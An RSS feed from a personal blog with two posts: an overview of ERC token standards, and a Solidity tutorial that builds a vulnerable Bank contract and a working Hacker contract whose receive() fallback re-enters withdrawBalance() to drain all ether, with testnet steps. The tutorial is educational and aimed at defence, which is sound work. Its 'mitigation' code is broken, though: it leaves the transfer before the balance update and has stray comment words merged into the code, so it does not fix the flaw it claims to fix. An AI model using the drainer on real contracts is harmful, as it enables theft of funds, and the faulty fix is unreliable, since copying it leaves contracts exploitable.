<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Somesh&#39;s Blog</title>
    <link>https://somesh-banerjee.github.io/blogs/</link>
    <description>Recent content on Somesh&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 12 Jan 2023 20:08:49 +0530</lastBuildDate><atom:link href="https://somesh-banerjee.github.io/blogs/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Erc Standards Part 2</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/erc-standards-p2/</link>
      <pubDate>Thu, 12 Jan 2023 20:08:49 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/erc-standards-p2/</guid>
      <description>In my last post on ERC standards, I discussed the basic ERC standards like ERC20, ERC721, ERC1155, etc. In this post, I will go over some more ERC standards finalized by the community.
ERC 1363: Payable Token​ Regarding ERC20 tokens, we generally use them for payment purposes like paying for an NFT, a service, etc. But after we transfer the ERC20 tokens, somebody on the other side has to initiate the next transaction.</description>
      <content>&lt;p&gt;In my last &lt;a href=&#34;../erc-standards&#34;&gt;post&lt;/a&gt; on ERC standards, I discussed the basic ERC standards like ERC20, ERC721, ERC1155, etc. In this post, I will go over some more ERC standards finalized by the community.&lt;/p&gt;
&lt;h1 id=&#34;erc-1363-payable-token&#34;&gt;ERC 1363: Payable Token​&lt;/h1&gt;
&lt;p&gt;Regarding ERC20 tokens, we generally use them for payment purposes like paying for an NFT, a service, etc. But after we transfer the ERC20 tokens, somebody on the other side has to initiate the next transaction. This results in paying the gas price twice for a single process(by process, I mean a set of steps like paying and getting an NFT). The payable token is introduced to solve this issue, where the ERC 1363 contract initiates the next transaction after payment is made.&lt;/p&gt;
&lt;h1 id=&#34;erc-2981-nft-royalty-standard&#34;&gt;ERC 2981: NFT Royalty Standard​&lt;/h1&gt;
&lt;p&gt;This ERC is developed to implement royalty features in the marketplaces. It is an extension for ERC721 and ERC1155 to give royalties to the creators. The standard introduces the following function to return royalty details like how much to transfer and whom to transfer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;royaltyInfo&lt;/span&gt;(
    &lt;span style=&#34;color:#a6e22e&#34;&gt;uint256&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_tokenId&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;uint256&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_salePrice&lt;/span&gt;
) &lt;span style=&#34;color:#a6e22e&#34;&gt;external&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;view&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt; (
    &lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;receiver&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;uint256&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;royaltyAmount&lt;/span&gt;
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we use this standard, royalty is not guaranteed as the ERC only gives royalty information. Implementing it relies on the marketplace where the transfer is happening.&lt;/p&gt;
&lt;h1 id=&#34;erc-3525-semi-fungible-token&#34;&gt;ERC 3525: Semi-Fungible Token​&lt;/h1&gt;
&lt;p&gt;Semi Fungible token is similar to ERC 721 tokens, where each type of token has a unique token Id, but two different token Ids are considered fungible if they share the same slot. This standard identifies the tokens by &amp;lt;ID, SLOT, VALUE&amp;gt;. The VALUE property tells the total supply of the token ID. We can transfer tokens between different IDs if they have the same slot.&lt;/p&gt;
&lt;h1 id=&#34;erc-4519-non-fungible-tokens-tied-to-physical-assets&#34;&gt;ERC 4519: Non-Fungible Tokens Tied to Physical Assets​&lt;/h1&gt;
&lt;p&gt;This token standard is built for smart physical devices with an address in the network. The ERC 721 only tracks ownership records and not usage rights. EIP 4519 was proposed to solve this issue, where the device, the token, and the user interact with each other to track all the records. To understand in-depth, read the &lt;a href=&#34;https://eips.ethereum.org/assets/eip-4519/sensors-21-03119.pdf&#34;&gt;paper&lt;/a&gt; published in Sensors journal.&lt;/p&gt;
&lt;h1 id=&#34;erc-4907-rental-nft&#34;&gt;ERC 4907: Rental NFT​&lt;/h1&gt;
&lt;p&gt;This standard is an extension of ERC 721. Here each NFT has an owner and a user. These two properties can be two different wallet addresses. The user will have limited control over the NFT, like he can&amp;rsquo;t transfer the NFT. The owner can set whom to make the user and for what duration, like rent.&lt;/p&gt;
&lt;h1 id=&#34;erc-5023-shareable-nft&#34;&gt;ERC 5023: Shareable NFT​&lt;/h1&gt;
&lt;p&gt;Shareable NFTs can be implemented in both ERC 721 and ERC 1155. In this standard, an NFT is shared with another user/wallet by reminting the same token and sending the newly minted token to the new owner. The freshly minted token represents the same digital asset but has a unique ID. The original token remains with the old owner.&lt;/p&gt;
&lt;h1 id=&#34;erc-5192-minimal-soul-bound-token&#34;&gt;ERC 5192: Minimal soul bound token​&lt;/h1&gt;
&lt;p&gt;This standard is an extension of ERC721. SoulBound token, as you can understand from the name, is a token bound to a single soul or wallet. To implement soulbond tokens,  the transfer function of the ERC721 token is disabled.&lt;/p&gt;
&lt;h1 id=&#34;erc-5484-consensual-soul-bound-tokens&#34;&gt;ERC 5484: Consensual Soul bound Tokens​&lt;/h1&gt;
&lt;p&gt;This standard is an extension of ERC721 and is almost similar to ERC 5192 but with one addition, i.e., the property of burn authorization. Burn Authorization means who can burn the token. It can be only the issuer, only the receiver, or both of them, or neither of them.&lt;/p&gt;
&lt;h1 id=&#34;erc-5528-refundable-fungible-token&#34;&gt;ERC 5528: Refundable Fungible Token​&lt;/h1&gt;
&lt;p&gt;This standard is an extension of ERC 20 tokens. When we send ERC 20 tokens for a task, and that task fails or is not completed, we don&amp;rsquo;t get our tokens back automatically. In ERC 5528, an escrow contract is used to solve this issue. Let&amp;rsquo;s understand this with a token swap example. The seller creates an escrow contract with a given condition.​ Both buyer and seller send the token to the escrow contract. If the requirement is fulfilled, then tokens are transferred to the respective receiver.​ If it fails, the buyer can withdraw the tokens submitted by him.​&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://eips.ethereum.org/erc&#34;&gt;ERC | Ethereum Improvement Proposals&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>Solidity Vulnerabilities</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/</link>
      <pubDate>Wed, 08 Jun 2022 23:35:09 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/solidity-vulnerabilities/</guid>
      <description>Introduction Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.
However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Smart contracts built on blockchain platforms like Ethereum have transformed various industries by enabling decentralized and trustless applications. Smart contracts are written in solidity language and deployed in the EVM blockchain, which enable self-executing agreements without the need for intermediaries, revolutionizing industries such as finance, governance, and others.&lt;/p&gt;
&lt;p&gt;However, we know blockchain is immutable and so are smart contracts; Once they are deployed, it cannot be changed. This means that any security flaw or vulnerability within the code remains permanently exploitable.&lt;/p&gt;
&lt;p&gt;In this article, I will go through some of the common solidity vulnerabilities in detail. We will try to recreate the  vulnerabilities in the contract to understand it and also discuss how to mitigate these pitfalls.&lt;/p&gt;
&lt;h1 id=&#34;re-entrancy-attack&#34;&gt;Re-entrancy attack&lt;/h1&gt;
&lt;p&gt;Re-entrancy attack is a type of attack where the malicious contract re-enters the target contract by calling the target contract&amp;rsquo;s function before the completion of its current execution.&lt;/p&gt;
&lt;p&gt;To understabd how it is happening, let&amp;rsquo;s understand it by considering contracts as persons. Imagine Person B who acts as a bank and maintain a registry for tracking the balance of other people. Now a malicious Person H deposits 100 money to B. B updates H&amp;rsquo;s balance in the registry to 100. Other persons have also deposited to B and the total value depositted is 1200.&lt;/p&gt;
&lt;p&gt;Whenever anybody withdraw money from B, he first gives the money and then update it in the registry. Now imagine H withdraws his money i.e. 100, and before it gets updated he agains withdraw it. Since the registry is not updated he agains get 100. H continues withdrawing until B has 0 balance.&lt;/p&gt;
&lt;p&gt;This sounds absurd in real life, that a person withdraws but he can withdraw again before the registry gets updated, but in smart contract, this is possible using &lt;code&gt;fallback&lt;/code&gt; functions. There is a function called &lt;code&gt;receive()&lt;/code&gt; which gets called everytime some ether is transferred to a contract.&lt;/p&gt;
&lt;p&gt;Let create a vulnerable contract Bank and try to recreate the attack.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

contract Bank &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    mapping &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; uint256&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; userBalance&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
   
   &lt;span style=&#34;color:#75715e&#34;&gt;// returns the balance of the user passed as parameter
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address u&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; view &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;u&lt;span style=&#34;color:#f92672&#34;&gt;];&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// returns the balance of the contract
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; view &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;balance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// deposit the amount passed with the call to the balance of the user
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;addToBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; payable&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;   

    &lt;span style=&#34;color:#75715e&#34;&gt;// withdraw the whole balance of the user
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; payable  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;bool sent&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;value&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]}(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        userBalance&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;   
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we will create the Attacker contract, that will drain the Bank contract using the &lt;code&gt;receive&lt;/code&gt; fallback function&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// SPDX-License-Identifier: MIT
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

contract Hacker &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    Bank bank&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

    constructor&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address _a&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        bank &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Bank&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_a&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    
    &lt;span style=&#34;color:#75715e&#34;&gt;// returns the balance of the contract
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; view &lt;span style=&#34;color:#a6e22e&#34;&gt;returns&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;balance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// attack the bank contract
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    function &lt;span style=&#34;color:#a6e22e&#34;&gt;attack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; payable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; 1 ether&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt; 
        bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;addToBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;value&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}();&lt;/span&gt;
        bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// fallback function which is called when the bank contract sends the ether
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    receive&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; external payable &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
            bank&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To understand the flow, first deploy the &lt;code&gt;Bank&lt;/code&gt; contract in the testnet and deposit 1 or more ether from multiple accounts/wallets. Now deploy the &lt;code&gt;Hacker&lt;/code&gt; contract. Pass the &lt;code&gt;Bank&lt;/code&gt; contract&amp;rsquo;s address while deploying. Call the &lt;code&gt;attack()&lt;/code&gt; function of the &lt;code&gt;Hacker&lt;/code&gt; contract with 1 ether value. After the call, you will notice that the balance of &lt;code&gt;Bank&lt;/code&gt; contract will be 0 and all the ether which was in &lt;code&gt;Bank&lt;/code&gt; is transferred to &lt;code&gt;Hacker&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;What is happening here is, when we call the &lt;code&gt;attack()&lt;/code&gt; function, the &lt;code&gt;Hacker&lt;/code&gt; contract first deposits 1 ether in the &lt;code&gt; Bank&lt;/code&gt; contract. After that &lt;code&gt;Hacker&lt;/code&gt; calls the &lt;code&gt;Bank.withdrawBalance()&lt;/code&gt; function. By calling the &lt;code&gt;withdrawBalance()&lt;/code&gt; function, the &lt;code&gt;Bank&lt;/code&gt; transfers the userBalnce of &lt;code&gt;Hacker&lt;/code&gt; i.e. 1 ether to &lt;code&gt;Hacker&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now in &lt;code&gt;Hacker&lt;/code&gt; we have defined the fallback function &lt;code&gt;receive()&lt;/code&gt; which is called when the 1 ether is transferred to the contract. In the &lt;code&gt;receive()&lt;/code&gt; function, we are again calling the &lt;code&gt;withdrawBalance()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now understand the &lt;code&gt;withdrawBalance()&lt;/code&gt; function flow in this case from the following snippet&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;payable&lt;/span&gt;  {
    (&lt;span style=&#34;color:#a6e22e&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sent&lt;/span&gt;, ) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;]}(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#75715e&#34;&gt;// . --&amp;gt; receive() is called at his point after transferring and before updating the userBalance
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From the above snippet you can understand, that wen the &lt;code&gt;receive()&lt;/code&gt; is being called the &lt;code&gt;userBalace&lt;/code&gt; mapping is not yet updated. Hence again 1 ether will be transferred. This transfer will again triger the &lt;code&gt;receive()&lt;/code&gt; and the process will go on recursively till it totally drains the &lt;code&gt;Bank&lt;/code&gt; contract.&lt;/p&gt;
&lt;h4 id=&#34;how-to-mitigate&#34;&gt;How to mitigate&lt;/h4&gt;
&lt;p&gt;To mitigate the reentrancy attack in the above scenario, we can just change the order of execution as follw:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;withdrawBalance&lt;/span&gt;() &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;payable&lt;/span&gt;  {
    (&lt;span style=&#34;color:#a6e22e&#34;&gt;bool&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sent&lt;/span&gt;, ) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;]}(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);&lt;span style=&#34;color:#a6e22e&#34;&gt;transferring&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;updating&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;userBalance&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;msg&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
} 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now if the Hacker recursively calls the &lt;code&gt;withdrawBalance()&lt;/code&gt; function, no ether will be transferred as the mapping is updated. So to avoid reentrancy first update the state variables and then interact with external contracts/wallets.&lt;/p&gt;
&lt;p&gt;Another way to prevent reentrancy is by using reentrancy guard. You can use state variables and modifier to design a guard, that will lock the function untill the execution is complete. For example:&lt;/p&gt;
